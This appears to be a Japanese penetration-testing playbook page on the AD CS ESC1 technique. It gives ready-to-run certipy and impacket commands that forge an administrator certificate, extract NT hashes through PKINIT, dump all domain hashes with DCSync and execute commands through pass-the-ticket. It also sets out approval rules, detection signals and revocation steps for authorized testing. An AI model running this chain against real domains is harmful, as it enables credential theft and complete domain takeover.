# ESC1 — ENROLLEE_SUPPLIES_SUBJECT + Client Authentication

> **スコープ**: AD CS テンプレートで申請者が SAN（Subject Alternative Name）を自由に指定できる場合に任意ユーザー名で証明書を発行し、PKINIT 認証で NT ハッシュ取得〜DCSync まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（任意ユーザー名で発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

以下のすべてが揃ったときに実施する：

- Certipy の出力で対象テンプレートに `[!] Vulnerabilities: ESC1` が表示されている
- または `Enrollee Supplies Subject: True` / `Client Authentication: True` / `Requires Manager Approval: False` / `Authorized Signatures Required: 0` / 低権限グループの Enrollment 権限 — の5条件がすべて手動で確認できる

## 環境前提
- 実行環境: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- 必要なツール: `certipy`（`pip install certipy-ad --break-system-packages`。標準搭載されていない場合が多い）
- 必要な権限: 対象テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）

## 先に確認すること

```bash
# [Attacker] 脆弱テンプレートを列挙（ESC1 を含む場合にのみ表示）
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

**攻撃者の思考トレース:** 「申請者が SAN（Subject Alternative Name）を自由に指定できる」かつ「そのテンプレートが認証に使えるなら」、自分を Domain Admin として証明書を発行できる。AD CS は発行した証明書の UPN を信用して TGT を渡すため、パスワードを知らなくても管理者として認証できる。

---

## 1. ESC1 条件確認

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `ESC1` が `[!] Vulnerabilities` に表示 | 直接悪用可能。§2 へ |
| `Requires Manager Approval: True` | 発行前に管理者承認が必要。ESC4 でテンプレートを修正できるか確認 → `ESC4.md` |
| `Authorized Signatures Required: 1` 以上 | Enrollment Agent 証明書が必要。ESC3 の構成になる → `ESC3.md` |
| `Enrollment Rights` に低権限グループが含まれない | Enrollment 権限をまず取得（GenericAll / WriteDACL 等）|
| ESC1 テンプレートが見つからない | ESC6（CA レベルの SAN 自由設定）も確認する → `ESC6.md` |

---

## 2. 証明書の申請（任意の UPN を SAN に埋め込む）

**事前準備（必須）:** 時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

**コマンド:**

```bash
# [Attacker] administrator として証明書を申請
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]
# → administrator.pfx が生成される
# CA_NAME は certipy find の "Certificate Authorities" フィールドで確認
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Saved certificate and private key to 'administrator.pfx'` | 証明書発行成功 | §3 PKINIT 認証へ |
| `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` 等のエラー | テンプレートが SAN 以外を必須にする設定 | 別テンプレートを探す |
| `ACCESS_DENIED` | Enrollment 権限の実際の割り当てを確認 | `certipy find` の出力と実際の ACL を照合 |

---

## 3. 証明書で PKINIT 認証 → NT ハッシュ取得

**コマンド:**

```bash
# [Attacker] PKINIT 認証 → TGT + NT ハッシュ同時取得
certipy auth \
  -pfx administrator.pfx \
  -dc-ip [DC_IP]
# → NT ハッシュと TGT（administrator.ccache）が出力される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| NT ハッシュが出力される | PKINIT 認証成功 | §4 DCSync へ |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | CA が DC に信頼されていない | `certutil -viewstore ldap:///CN=NTAuthCertificates,...` で確認 |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | DC が PKINIT をサポートしていない | DC の OS バージョン確認（Server 2008 以前はデフォルト無効）|

---

## 4. NT ハッシュで DCSync

**コマンド:**

```bash
# [Attacker] NT ハッシュで DCSync → 全ドメインユーザーのハッシュ取得
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/administrator@[DC_IP]

# [Attacker] TGT で Pass-the-Ticket 経由でコマンド実行
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass -target-ip [DC_IP] [DOMAIN]/administrator@[DC_FQDN]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 全ドメインユーザーのハッシュが出力される | DCSync 成功 → ドメイン完全制御 | `../Credential_Dumping.md`（取得情報の管理）|

---

## 5. 原状回復（必須）: 証明書の失効

```bash
# [Attacker] 発行した証明書を CA で失効（テスト完了時必須）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| `ACCESS_DENIED` | Enrollment 権限の実際の割り当てを確認 |
| `Protected Users` グループのメンバーには PKINIT が効かない | `certipy auth` が失敗した場合はグループ所属を確認 |
| ESC1 テンプレートが見つからない | ESC6 も確認 → `ESC6.md` |

---

## 注意点・落とし穴

- **発行した証明書はパスワードリセット後も有効**: 持続化経路として意識的に管理する
- **`-upn` と `-target` の使い分け**: `-upn` は SAN に任意の UPN を埋め込む（ESC1 では `-upn` を使う）
- **CA サーバーと DC が別ホストの場合がある**: `CA_NAME` は `certipy find` の `Certificate Authorities` フィールドを使う

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。任意ユーザーとして証明書を発行するためドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886（証明書要求受信）/ 4887（証明書発行）/ 4768（TGT 要求、UPN 不一致で検知）/ MDI「疑わしい証明書の使用」アラート
- **業務影響リスク**: 証明書発行自体は業務影響なし。DCSync は全ハッシュ取得のため書面承認必須
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効（`certipy ca -revoke [REQUEST_ID]`）/ ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC4（テンプレート設定変更で ESC1 化）→ `ESC4.md`
- 後：証明書取得後 → PKINIT → DCSync → `../Credential_Dumping.md`
- 後：ESC6（CA レベルの SAN 自由指定）→ `ESC6.md`
- 後：横展開（DCSync 取得後）→ `../Kerberos_Attacks/Pass_The_Ticket.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
